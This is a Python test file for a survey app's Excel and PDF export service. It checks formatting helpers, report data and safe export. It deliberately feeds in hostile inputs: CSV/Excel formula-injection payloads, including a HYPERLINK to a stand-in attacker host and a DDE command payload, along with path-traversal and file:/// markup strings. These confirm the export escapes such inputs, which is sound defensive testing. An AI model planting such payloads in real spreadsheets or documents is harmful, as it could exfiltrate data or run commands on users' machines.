import unittest
import zipfile
from datetime import date
from decimal import Decimal
from io import BytesIO
from types import SimpleNamespace
from uuid import uuid4

from fastapi import HTTPException

from app.models import ResponseStatus
from app.services.export_service import (
    PDF_ANSWER_MAX_CHARACTERS,
    PDF_ANSWER_MAX_LINES,
    _format_answer,
    _number,
    _safe_filename,
    _truncate_for_pdf,
    build_excel_export,
    build_pdf_export,
    export_report_data,
)
from tests.integration.db import requires_database, rolled_back_session
from tests.integration.factories import make_campaign, make_published_survey, make_workspace
from tests.integration.test_analytics_service import add_response

INJECTION_PAYLOADS = [
    '=HYPERLINK("https://attacker.example/steal","Click me")',
    "+1+1",
    "-2+3",
    "@SUM(1,1)",
    "=cmd|' /C calc'!A0",
]


def workbook_parts(content: bytes) -> dict[str, str]:
    with zipfile.ZipFile(BytesIO(content)) as archive:
        return {name: archive.read(name).decode("utf-8") for name in archive.namelist()}


class FormattingHelperTests(unittest.TestCase):
    def test_numbers_drop_trailing_zeros(self) -> None:
        self.assertEqual(_number(Decimal("4.50")), "4.5")
        self.assertEqual(_number(5), "5")
        self.assertEqual(_number(0), "0")
        self.assertEqual(_number(3.14159), "3.14")
        self.assertEqual(_number(None), "")

    def test_filenames_are_reduced_to_safe_characters(self) -> None:
        self.assertEqual(_safe_filename("Customer Survey 2026!"), "customer-survey-2026")
        self.assertEqual(_safe_filename("../../etc/passwd"), "etc-passwd")
        self.assertEqual(_safe_filename("???"), "report")
        self.assertEqual(_safe_filename(""), "report")

    def test_short_answers_are_not_truncated_for_the_pdf(self) -> None:
        self.assertEqual(_truncate_for_pdf("Fine as is\nOn two lines"), "Fine as is\nOn two lines")
        exactly_at_limit = "z" * PDF_ANSWER_MAX_CHARACTERS
        self.assertEqual(_truncate_for_pdf(exactly_at_limit), exactly_at_limit)

    def test_long_answers_are_truncated_by_characters_and_by_lines(self) -> None:
        by_characters = _truncate_for_pdf("z" * (PDF_ANSWER_MAX_CHARACTERS + 1))
        self.assertIn("Truncated", by_characters)
        self.assertLessEqual(len(by_characters), PDF_ANSWER_MAX_CHARACTERS + 100)
        by_lines = _truncate_for_pdf("\n".join(["row"] * (PDF_ANSWER_MAX_LINES + 5)))
        self.assertIn("Truncated", by_lines)
        self.assertLessEqual(by_lines.count("\n"), PDF_ANSWER_MAX_LINES)

    def test_answers_are_rendered_by_type(self) -> None:
        def answer(**values):
            defaults = dict(boolean_value=None, text_value=None, number_value=None)
            return SimpleNamespace(**{**defaults, "date_value": None, "other_text": None, **values})

        self.assertEqual(_format_answer(answer(boolean_value=True), []), "Yes")
        self.assertEqual(_format_answer(answer(boolean_value=False), []), "No")
        self.assertEqual(_format_answer(answer(text_value="Hello"), []), "Hello")
        self.assertEqual(_format_answer(answer(number_value=Decimal("7.0")), []), "7")
        self.assertEqual(_format_answer(answer(date_value=date(2026, 3, 9)), []), "2026-03-09")
        self.assertEqual(_format_answer(answer(), ["A", "B"]), "A; B")
        self.assertEqual(_format_answer(answer(other_text="Else"), ["A"]), "A; Other: Else")
        self.assertEqual(_format_answer(answer(), []), "")


@requires_database
class ExportReportDataTests(unittest.IsolatedAsyncioTestCase):
    async def test_matrix_lists_completed_responses_with_answers_in_question_order(self) -> None:
        async with rolled_back_session() as session:
            fixture = await make_published_survey(session)
            campaign = await make_campaign(session, fixture)
            await add_response(
                session, campaign, fixture, rating=5, choice="yes", yes_no=True, comment="Great"
            )
            await add_response(session, campaign, fixture, rating=2)
            await add_response(
                session, campaign, fixture, rating=1, status=ResponseStatus.IN_PROGRESS
            )
            data = await export_report_data(session, fixture.workspace.id, campaign.id)
            self.assertEqual(
                [question.title for question in data["questions"]],
                ["rating", "choice", "yes_no", "comment"],
            )
            matrix = data["response_matrix"]
            self.assertEqual(len(matrix), 2)
            self.assertEqual(sorted(row["answers"][0] for row in matrix), ["2", "5"])
            full = next(row for row in matrix if row["answers"][0] == "5")
            self.assertEqual(full["answers"], ["5", "Yes", "Yes", "Great"])
            partial = next(row for row in matrix if row["answers"][0] == "2")
            self.assertEqual(partial["answers"], ["2", "", "", ""])

    async def test_normalized_answers_carry_section_question_and_type(self) -> None:
        async with rolled_back_session() as session:
            fixture = await make_published_survey(session)
            campaign = await make_campaign(session, fixture)
            await add_response(session, campaign, fixture, rating=4)
            data = await export_report_data(session, fixture.workspace.id, campaign.id)
            (row,) = data["normalized_answers"]
            self.assertEqual(row["section"], "Section")
            self.assertEqual(row["question"], "rating")
            self.assertEqual(row["question_type"], "Rating")
            self.assertEqual(row["answer"], "4")

    async def test_campaign_without_responses_exports_empty_data(self) -> None:
        async with rolled_back_session() as session:
            fixture = await make_published_survey(session)
            campaign = await make_campaign(session, fixture)
            data = await export_report_data(session, fixture.workspace.id, campaign.id)
            self.assertEqual(data["response_matrix"], [])
            self.assertEqual(data["normalized_answers"], [])

    async def test_unknown_campaign_or_wrong_workspace_returns_404(self) -> None:
        async with rolled_back_session() as session:
            fixture = await make_published_survey(session)
            campaign = await make_campaign(session, fixture)
            _, other_workspace = await make_workspace(session)
            for workspace_id, campaign_id in [
                (fixture.workspace.id, uuid4()),
                (other_workspace.id, campaign.id),
            ]:
                with self.assertRaises(HTTPException) as context:
                    await export_report_data(session, workspace_id, campaign_id)
                self.assertEqual(context.exception.status_code, 404)


@requires_database
class BuildExportTests(unittest.IsolatedAsyncioTestCase):
    async def _report_data(self, session, comments: list[str]):
        fixture = await make_published_survey(session)
        campaign = await make_campaign(session, fixture)
        for index, comment in enumerate(comments):
            await add_response(session, campaign, fixture, rating=index % 5 + 1, comment=comment)
        return await export_report_data(session, fixture.workspace.id, campaign.id)

    async def test_excel_export_is_a_workbook_with_a_safe_filename(self) -> None:
        async with rolled_back_session() as session:
            data = await self._report_data(session, ["Great service"])
            content, filename = build_excel_export(data)
            self.assertTrue(content.startswith(b"PK"))
            self.assertTrue(filename.endswith(".xlsx"))
            self.assertRegex(filename, r"^[a-z0-9._-]+$")
            parts = workbook_parts(content)
            self.assertIn("Great service", parts["xl/sharedStrings.xml"])

    async def test_excel_export_never_writes_respondent_text_as_formulas(self) -> None:
        async with rolled_back_session() as session:
            data = await self._report_data(session, INJECTION_PAYLOADS)
            content, _ = build_excel_export(data)
            parts = workbook_parts(content)
            for name, xml in parts.items():
                if name.startswith("xl/worksheets/sheet"):
                    self.assertNotRegex(xml, r"<f[ >]", f"formula cell found in {name}")
            strings = parts["xl/sharedStrings.xml"]
            self.assertIn("+1+1", strings)
            self.assertIn("HYPERLINK", strings)

    async def test_excel_export_handles_an_empty_campaign(self) -> None:
        async with rolled_back_session() as session:
            data = await self._report_data(session, [])
            content, _ = build_excel_export(data)
            self.assertTrue(content.startswith(b"PK"))

    async def test_pdf_export_is_a_pdf_with_a_safe_filename(self) -> None:
        async with rolled_back_session() as session:
            data = await self._report_data(session, ["Great service"])
            content, filename = build_pdf_export(data)
            self.assertTrue(content.startswith(b"%PDF"))
            self.assertTrue(filename.endswith(".pdf"))
            self.assertRegex(filename, r"^[a-z0-9._-]+$")

    async def test_pdf_export_survives_markup_and_unicode_in_answers(self) -> None:
        hostile = [
            "<b>unclosed bold",
            "</para><para>",
            "<img src='file:///etc/passwd'/>",
            "Fish & Chips <3",
            "Grüße, Größe, 日本語, emoji 😀",
            "x" * 5000,
            "line one\nline two",
            "y" * 10_000,
            "short line\n" * 3_000,
        ]
        async with rolled_back_session() as session:
            data = await self._report_data(session, hostile)
            content, _ = build_pdf_export(data)
            self.assertTrue(content.startswith(b"%PDF"))

    async def test_pdf_export_handles_an_empty_campaign(self) -> None:
        async with rolled_back_session() as session:
            data = await self._report_data(session, [])
            content, _ = build_pdf_export(data)
            self.assertTrue(content.startswith(b"%PDF"))


if __name__ == "__main__":
    unittest.main()
